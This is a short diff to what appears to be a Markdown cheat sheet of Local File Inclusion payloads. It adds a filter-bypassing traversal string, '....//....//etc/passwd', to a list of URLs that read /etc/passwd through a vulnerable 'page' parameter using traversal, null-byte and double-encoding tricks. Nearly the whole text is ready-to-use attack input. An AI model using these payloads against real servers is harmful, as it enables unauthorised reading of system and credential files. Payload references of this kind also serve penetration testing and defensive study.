@@ -3,12 +3,13 @@ The File Inclusion vulnerability allows an attacker to include a file, usually e
 
 ## Exploit
 
-Basic LFI (null byte and double encoding)
+Basic LFI (null byte, double encoding and other tricks)
 ```
 http://example.com/index.php?page=etc/passwd
 http://example.com/index.php?page=etc/passwd%00
 http://example.com/index.php?page=../../etc/passwd
 http://example.com/index.php?page=%252e%252e%252f
+http://example.com/index.php?page=....//....//etc/passwd
 ```
 
 LFI Wrapper rot13 and base64 - php://filter case insensitive
